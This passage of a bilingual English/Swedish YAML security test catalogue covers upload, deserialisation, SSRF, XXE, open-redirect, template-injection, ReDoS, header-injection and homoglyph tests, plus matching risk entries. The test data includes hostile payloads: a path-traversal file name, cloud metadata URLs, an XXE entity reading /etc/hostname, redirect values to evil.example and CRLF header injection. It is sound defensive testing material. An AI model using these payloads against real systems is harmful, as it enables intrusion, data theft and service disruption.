        - action: Upload a PDF file of 10 MB plus one byte.
          expected: The file is rejected with a message that states the size limit.
        - action: Upload an executable file renamed to report.pdf.
          expected: The file is rejected because its content is not an allowed type.
          data: report.pdf (PE executable)
    sv:
      title: Uppladdningar kontrolleras för storlek och verklig filtyp
      description: Laddar upp filer vid storleksgränsen, över den och med en vilseledande filändelse.
      preconditions: En inloggad användare på en sida med filuppladdning och testfiler som förberetts i förväg.
      expected: Bara tillåtna filtyper upp till 10 MB godtas.
      steps:
        - action: Ladda upp en PDF-fil på exakt 10 MB.
          expected: Filen godtas.
        - action: Ladda upp en PDF-fil på 10 MB plus en byte.
          expected: Filen avvisas med ett meddelande som anger storleksgränsen.
        - action: Ladda upp en körbar fil som har döpts om till rapport.pdf.
          expected: Filen avvisas eftersom innehållet inte är en tillåten typ.
          data: rapport.pdf (PE-körbar fil)

  - id: INP-T08
    priority: high
    execution: manual
    tags: [file-upload, storage, path-traversal]
    refs: ["OWASP Web Security Testing Guide WSTG-ATHZ-01", "ISO/IEC 27001:2022 A.8.28", "CWE-552 (files or directories accessible to external parties)", "MITRE ATT&CK T1505.003 (web shell)"]
    en:
      title: Uploaded files cannot be executed or overwrite files
      description: Uploads a file with a path in its name and checks where and how it is stored.
      preconditions: A signed-in user on a page with a file upload, and read access to the server storage.
      expected: The file is stored under a generated name outside the web root.
      steps:
        - action: Upload a file whose name contains a relative path.
          expected: The upload succeeds or is rejected, and no existing file on the server changes.
          data: ../../index.html
        - action: Locate the stored file on the server.
          expected: It is outside the web server's document root and has a generated name.
        - action: Try to open the file through a URL directly under the web root.
          expected: The file is not reachable there and is served only through the download function.
    sv:
      title: Uppladdade filer kan inte köras eller skriva över filer
      description: Laddar upp en fil med en sökväg i namnet och kontrollerar var och hur den lagras.
      preconditions: En inloggad användare på en sida med filuppladdning och läsbehörighet till serverns lagring.
      expected: Filen lagras under ett genererat namn utanför webbroten.
      steps:
        - action: Ladda upp en fil vars namn innehåller en relativ sökväg.
          expected: Uppladdningen lyckas eller avvisas, och ingen befintlig fil på servern ändras.
          data: ../../index.html
        - action: Leta upp den lagrade filen på servern.
          expected: Den ligger utanför webbserverns dokumentrot och har ett genererat namn.
        - action: Försök öppna filen via en adress direkt under webbroten.
          expected: Filen går inte att nå där och serveras bara via nedladdningsfunktionen.

  - id: INP-T09
    priority: critical
    execution: manual
    tags: [deserialisation]
    refs: ["OWASP Deserialization Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-502 (deserialization of untrusted data)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    en:
      title: Serialised object payloads are not executed
      description: Reviews the parsing of untrusted data and sends a known gadget-chain payload to endpoints that accept serialised data.
      preconditions: A list of endpoints, message consumers and cookies that carry serialised data, and a callback host that records connections.
      expected: No payload causes code execution or a callback.
      steps:
        - action: Review how each listed input is parsed.
          expected: Each uses a data-only format into fixed types and no native object deserialisation.
        - action: Send a gadget-chain payload that opens a connection to the callback host to each listed input.
          expected: The input is rejected and the callback host records no connection.
    sv:
      title: Nyttolaster med serialiserade objekt körs inte
      description: Granskar hur opålitliga data tolkas och skickar en känd nyttolast med gadgetkedja till endpoints som tar emot serialiserade data.
      preconditions: En lista över endpoints, meddelandekonsumenter och kakor som bär serialiserade data, och en värd för återanrop som registrerar förbindelser.
      expected: Ingen nyttolast leder till kodkörning eller återanrop.
      steps:
        - action: Granska hur varje listad indatakälla tolkas.
          expected: Var och en använder ett rent dataformat till fasta typer och ingen inbyggd objektdeserialisering.
        - action: Skicka en nyttolast med gadgetkedja som öppnar en förbindelse till återanropsvärden till varje listad indatakälla.
          expected: Indata avvisas och återanropsvärden registrerar ingen förbindelse.

  - id: INP-T10
    priority: critical
    execution: automated
    tags: [ssrf]
    refs: ["OWASP Server-Side Request Forgery Prevention Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "CWE-918 (server-side request forgery)", "MITRE ATT&CK T1552.005 (cloud instance metadata API)"]
    en:
      title: User-supplied URLs to internal addresses are refused
      description: A script registers webhook or import URLs that point to internal addresses and checks that no request is made.
      preconditions: A feature that fetches a user-supplied URL, a test DNS name that resolves to 10.0.0.5, and network monitoring on the server.
      expected: Every internal target is refused and no connection to it is opened.
      steps:
        - action: Submit URLs with loopback, private and metadata IP addresses.
          expected: Each URL is refused with a validation error.
          data: "http://127.0.0.1/, http://10.0.0.1/, http://169.254.169.254/latest/meta-data/"
        - action: Submit a URL with the test DNS name that resolves to a private address.
          expected: The URL is refused and no connection to 10.0.0.5 is seen.
        - action: Submit a URL that redirects to 127.0.0.1.
          expected: The redirect is not followed to the internal address.
    sv:
      title: Adresser från användare till interna adresser avvisas
      description: Ett skript registrerar adresser för webhooks eller import som pekar på interna adresser och kontrollerar att inget anrop görs.
      preconditions: En funktion som hämtar en adress från användaren, ett DNS-testnamn som pekar på 10.0.0.5 och nätverksövervakning på servern.
      expected: Varje internt mål avvisas och ingen förbindelse öppnas mot det.
      steps:
        - action: Skicka adresser med IP-adresser för loopback, privata nät och metadata.
          expected: Varje adress avvisas med ett valideringsfel.
          data: "http://127.0.0.1/, http://10.0.0.1/, http://169.254.169.254/latest/meta-data/"
        - action: Skicka en adress med DNS-testnamnet som pekar på en privat adress.
          expected: Adressen avvisas och ingen förbindelse till 10.0.0.5 syns.
        - action: Skicka en adress som omdirigerar till 127.0.0.1.
          expected: Omdirigeringen följs inte till den interna adressen.

  - id: INP-T11
    priority: high
    execution: automated
    tags: [xml, xxe]
    refs: ["OWASP Web Security Testing Guide WSTG-INPV-07", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-611 (XML external entity reference)", "CWE-776 (XML entity expansion)"]
    en:
      title: XML with external entities is rejected
      description: A script uploads XML documents with an external entity to every XML input.
      preconditions: A list of endpoints and import functions that accept XML.
      expected: No document type definition is processed and no file content leaks.
      steps:
        - action: Send an XML document whose external entity refers to /etc/hostname to each XML input.
          expected: Each request is rejected and the host name of the server does not appear in any response.
          data: "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/hostname\">]><x>&e;</x>"
        - action: Send an XML document with nested entities that expand to 1 GB.
          expected: Each request is rejected within 2 seconds and memory use stays flat.
    sv:
      title: XML med externa entiteter avvisas
      description: Ett skript laddar upp XML-dokument med en extern entitet till varje XML-indata.
      preconditions: En lista över endpoints och importfunktioner som tar emot XML.
      expected: Ingen dokumenttypsdefinition behandlas och inget filinnehåll läcker.
      steps:
        - action: Skicka ett XML-dokument vars externa entitet pekar på /etc/hostname till varje XML-indata.
          expected: Varje anrop avvisas och serverns värdnamn syns inte i något svar.
          data: "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/hostname\">]><x>&e;</x>"
        - action: Skicka ett XML-dokument med nästlade entiteter som expanderar till 1 GB.
          expected: Varje anrop avvisas inom 2 sekunder och minnesanvändningen förblir oförändrad.

  - id: INP-T12
    priority: high
    execution: automated
    tags: [open-redirect]
    refs: ["OWASP Web Security Testing Guide WSTG-CLNT-04", "CWE-601 (open redirect)", "MITRE ATT&CK T1566.002 (spearphishing link)"]
    en:
      title: Redirect parameters cannot send users to other sites
      description: A script signs in with manipulated return URLs and checks where the browser ends up.
      preconditions: A test account, the name of the redirect parameter and the configured allow-list of hosts.
      expected: Only own paths and listed hosts are followed.
      steps:
        - action: Sign in with the return parameter set to a relative path on the system.
          expected: The browser ends on that path.
          data: "/projects/42"
        - action: Sign in with each of the malicious values.
          expected: Each ends on the system's start page and no request goes to the external host.
          data: "https://evil.example/, //evil.example/, /\\evil.example/, javascript:alert(1)"
        - action: Sign in with a URL on a host on the allow-list.
          expected: The browser ends on that URL.
    sv:
      title: Omdirigeringsparametrar kan inte skicka användare till andra webbplatser
      description: Ett skript loggar in med manipulerade returadresser och kontrollerar var webbläsaren hamnar.
      preconditions: Ett testkonto, namnet på omdirigeringsparametern och den konfigurerade tillåtelselistan med värdar.
      expected: Endast egna sökvägar och listade värdar följs.
      steps:
        - action: Logga in med returparametern satt till en relativ sökväg i systemet.
          expected: Webbläsaren hamnar på den sökvägen.
          data: "/projects/42"
        - action: Logga in med vart och ett av de skadliga värdena.
          expected: Vart och ett hamnar på systemets startsida och inget anrop går till den externa värden.
          data: "https://evil.example/, //evil.example/, /\\evil.example/, javascript:alert(1)"
        - action: Logga in med en adress på en värd i tillåtelselistan.
          expected: Webbläsaren hamnar på den adressen.

  - id: INP-T13
    priority: critical
    execution: manual
    tags: [template-injection]
    refs: ["OWASP Web Security Testing Guide WSTG-INPV-18", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    en:
      title: Template expressions in input are not evaluated
      description: Enters template expressions of common engines in user fields and editable templates and looks at the rendered output.
      preconditions: A test account, an administrator account with access to the email template editor, and a way to read sent test emails.
      expected: No expression is evaluated by a code-capable engine.
      steps:
        - action: Put the probes into the display name and a record title and view the pages and generated documents that show them.
          expected: The probes appear literally.
          data: "{{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{config}}"
        - action: As administrator, put the same probes into an email template and send a test email.
          expected: The email shows the probes literally or as empty placeholders, never 49 or configuration values.
    sv:
      title: Malluttryck i indata utvärderas inte
      description: Skriver in malluttryck för vanliga mallmotorer i användarfält och redigerbara mallar och granskar det tolkade resultatet.
      preconditions: Ett testkonto, ett administratörskonto med åtkomst till redigeraren för e-postmallar och ett sätt att läsa skickade testmejl.
      expected: Inget uttryck utvärderas av en motor som kan köra kod.
      steps:
        - action: Skriv in sonderna i visningsnamnet och i en posts rubrik och visa sidorna och de genererade dokumenten där de syns.
          expected: Sonderna visas bokstavligt.
          data: "{{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{config}}"
        - action: Skriv som administratör in samma sonder i en e-postmall och skicka ett testmejl.
          expected: Mejlet visar sonderna bokstavligt eller som tomma platshållare, aldrig 49 eller konfigurationsvärden.

  - id: INP-T14
    priority: medium
    execution: automated
    tags: [redos]
    refs: ["CWE-1333 (inefficient regular expression complexity)", "MITRE ATT&CK T1499.004 (application or system exploitation)"]
    en:
      title: Catastrophic backtracking input is handled in time
      description: A script sends crafted strings to each field that is validated with a regular expression and measures the response time.
      preconditions: The list of input fields validated by regular expressions and a test account.
      expected: Each request is answered and each evaluation finishes within 100 ms.
      steps:
        - action: For each field, send a 50 000-character string that repeats a matching prefix and ends with a character that fails the pattern.
          expected: Each request is answered with a validation result.
          data: "'a' × 50 000 followed by '!' for an email or name field"
        - action: Read the evaluation times from the server metrics or logs.
          expected: No evaluation took more than 100 ms.
    sv:
      title: Indata som ger katastrofal bakåtspårning hanteras i tid
      description: Ett skript skickar konstruerade strängar till varje fält som valideras med ett reguljärt uttryck och mäter svarstiden.
      preconditions: Listan över indatafält som valideras med reguljära uttryck och ett testkonto.
      expected: Varje anrop besvaras och varje utvärdering är klar inom 100 ms.
      steps:
        - action: Skicka för varje fält en sträng på 50 000 tecken som upprepar ett matchande prefix och slutar med ett tecken som inte passar mönstret.
          expected: Varje anrop besvaras med ett valideringsresultat.
          data: "'a' × 50 000 följt av '!' för ett fält för e-post eller namn"
        - action: Läs utvärderingstiderna i serverns mätvärden eller loggar.
          expected: Ingen utvärdering tog mer än 100 ms.

  - id: INP-T15
    priority: high
    execution: automated
    tags: [header-injection]
    refs: ["CWE-113 (HTTP response splitting)"]
    en:
      title: Encoded line breaks do not add response headers
      description: A script sends values with encoded line breaks to endpoints that reflect input into headers.
      preconditions: The list of endpoints that put user values in headers, such as downloads with a file name and redirects.
      expected: No response contains an added header or cookie.
      steps:
        - action: Upload a file whose name contains an encoded line break and a header, then download it.
          expected: The Content-Disposition header contains no line break and no Set-Cookie header is added.
          data: "report%0d%0aSet-Cookie:%20injected=1.pdf"
        - action: Call a redirect endpoint with the same payload in the target.
          expected: The response has no injected header and no cookie named injected.
    sv:
      title: Kodade radbrytningar lägger inte till svarshuvuden
      description: Ett skript skickar värden med kodade radbrytningar till ändpunkter som återger indata i huvuden.
      preconditions: Listan över ändpunkter som lägger användarvärden i huvuden, till exempel nedladdningar med filnamn och omdirigeringar.
      expected: Inget svar innehåller ett tillagt huvud eller en tillagd kaka.
      steps:
        - action: Ladda upp en fil vars namn innehåller en kodad radbrytning och ett huvud, och ladda sedan ned den.
          expected: Content-Disposition-huvudet innehåller ingen radbrytning och inget Set-Cookie-huvud läggs till.
          data: "report%0d%0aSet-Cookie:%20injected=1.pdf"
        - action: Anropa en omdirigeringsändpunkt med samma innehåll i målet.
          expected: Svaret har inget injicerat huvud och ingen kaka som heter injected.

  - id: INP-T16
    priority: medium
    execution: manual
    tags: [unicode, spoofing]
    refs: ["Unicode Technical Standard #39", "CWE-1007 (insufficient visual distinction of homoglyphs)", "CWE-180 (validate before canonicalize)", "MITRE ATT&CK T1036.010 (masquerade account name)"]
    en:
      title: Look-alike user names are refused
      description: Tries to register user names that look like an existing administrator name.
      preconditions: An existing user named "admin" and a registration form.
      expected: Each look-alike name is refused.
      steps:
        - action: Register a user name with a Cyrillic а in place of the Latin a.
          expected: The name is refused as already taken or too similar.
          data: "аdmin (U+0430)"
        - action: Register the name in full-width letters.
          expected: The name is refused.
          data: "ａｄｍｉｎ"
        - action: Register the name "admin2".
          expected: The name is accepted.
    sv:
      title: Förväxlingsbara användarnamn avvisas
      description: Försöker registrera användarnamn som liknar namnet på en befintlig administratör.
      preconditions: En befintlig användare med namnet "admin" och ett registreringsformulär.
      expected: Varje förväxlingsbart namn avvisas.
      steps:
        - action: Registrera ett användarnamn med kyrilliskt а i stället för latinskt a.
          expected: Namnet avvisas som upptaget eller för likt ett befintligt.
          data: "аdmin (U+0430)"
        - action: Registrera namnet med breda tecken.
          expected: Namnet avvisas.
          data: "ａｄｍｉｎ"
        - action: Registrera namnet "admin2".
          expected: Namnet godtas.

risks:
  - id: INP-R01
    category: security
    likelihood: 3
    impact: 5
    tags: [injection, sql]
    refs: ["ISO/IEC 27005:2022 §7 (risk assessment process)", "OWASP Top 10 2021 A03", "CWE-89 (SQL injection)", "CWE-78 (OS command injection)"]
    mitigated_by: [INP-02, INP-03, INP-04, INP-13, INP-01]
    attack: [T1190]
    en:
      title: Injection gives control of the database or server
      description: Input reaches a database query, shell command, directory filter or template without separation from the code. An attacker reads or deletes all data, or runs commands on the server.
      mitigation: Use parameterised queries, keep user input out of shell commands and templates, escape directory filters and validate input on the server.
    sv:
      title: Injektion ger kontroll över databasen eller servern
      description: Inmatning når en databasfråga, ett skalkommando, ett katalogfilter eller en mall utan att hållas åtskild från koden. En angripare läser eller raderar all data eller kör kommandon på servern.
      mitigation: Använd parametriserade frågor, håll användarinmatning borta från skalkommandon och mallar, skydda katalogfilter och validera inmatning på servern.
  - id: INP-R02
    category: security
    likelihood: 4
    impact: 4
    tags: [xss, session-theft]
    refs: ["ISO/IEC 27005:2022 §7 (risk assessment process)", "OWASP Top 10 2021 A03", "CWE-79 (cross-site scripting)", "CWE-116 (improper encoding or escaping of output)"]
    mitigated_by: [INP-05, INP-06, SESS-06]
    attack: [T1059.007, T1539]
    en:
      title: Script injected into pages acts for the victim
      description: Text from one user is shown to others without encoding and runs as script in their browsers. The script reads data, performs actions in the victim's name or steals the session.
      mitigation: Encode output for its context, apply a Content Security Policy without inline scripts and protect the session cookie from scripts.
    sv:
      title: Injicerat skript på sidor agerar för offret
      description: Text från en användare visas för andra utan kodning och körs som skript i deras webbläsare. Skriptet läser data, utför åtgärder i offrets namn eller stjäl sessionen.
      mitigation: Koda utdata för sitt sammanhang, tillämpa en Content Security Policy utan inbäddade skript och skydda sessionskakan från skript.
  - id: INP-R03
    category: security
    likelihood: 3
    impact: 4
    tags: [ssrf, cloud-metadata]
    refs: ["ISO/IEC 27005:2022 §7 (risk assessment process)", "OWASP Top 10 2021 A10", "CWE-918 (server-side request forgery)"]
    mitigated_by: [INP-10, SECR-13]
    attack: [T1552.005, T1190]
    en:
      title: Server tricked into calling internal services
      description: A feature that fetches a URL supplied by the user is pointed at internal addresses or the cloud metadata service. The attacker reads internal data or obtains the server's cloud credentials.
      mitigation: Allow outgoing requests only to listed destinations, block internal and metadata addresses and use workload identity instead of static cloud keys.
    sv:
      title: Servern luras att anropa interna tjänster
      description: En funktion som hämtar en adress som användaren anger pekas mot interna adresser eller molnets metadatatjänst. Angriparen läser intern data eller får serverns inloggningsuppgifter i molnet.
      mitigation: Tillåt utgående anrop bara till listade mål, blockera interna adresser och metadataadresser och använd arbetslastidentitet i stället för statiska molnnycklar.
  - id: INP-R04
    category: security
    likelihood: 2
    impact: 5
    tags: [deserialisation, xml]
    refs: ["ISO/IEC 27005:2022 §7 (risk assessment process)", "OWASP Top 10 2021 A08", "CWE-502 (deserialization of untrusted data)", "CWE-611 (XML external entity reference)"]
    mitigated_by: [INP-09, INP-11, SDL-13]
    attack: [T1190]
    en:
      title: Remote code execution through crafted data formats
      description: The system deserialises objects from untrusted input or lets its XML parser resolve external entities. A crafted message runs code, reads local files or exhausts memory.
      mitigation: Deserialise no untrusted objects, turn off external entities in XML parsers and fuzz the parsers that handle external input.
    sv:
      title: Fjärrexekvering av kod via konstruerade dataformat
      description: Systemet deserialiserar objekt från inmatning som inte är betrodd eller låter sin XML-tolk slå upp externa entiteter. Ett konstruerat meddelande kör kod, läser lokala filer eller förbrukar allt minne.
      mitigation: Deserialisera inga objekt från källor som inte är betrodda, stäng av externa entiteter i XML-tolkar och fuzztesta de tolkar som hanterar extern inmatning.
  - id: INP-R05
    category: availability
    likelihood: 3
    impact: 3
    tags: [redos, denial-of-service]
    refs: ["ISO/IEC 27005:2022 §7 (risk assessment process)", "CWE-1333 (inefficient regular expression complexity)", "CWE-776 (XML entity expansion)"]
    mitigated_by: [INP-14, INP-11, APIS-07]
    attack: [T1499.004]
    en:
      title: Crafted input stalls the service
      description: A short input makes a regular expression or an XML parser work for minutes. A few such requests occupy every worker and the service stops responding.
      mitigation: Use regular expressions that run in bounded time, limit entity expansion and limit the request body size.
    sv:
      title: Konstruerad inmatning låser tjänsten
      description: En kort inmatning får ett reguljärt uttryck eller en XML-tolk att arbeta i flera minuter. Ett fåtal sådana anrop upptar alla arbetsprocesser och tjänsten slutar svara.
      mitigation: Använd reguljära uttryck med begränsad körtid, begränsa expansionen av entiteter och begränsa meddelandestorleken.
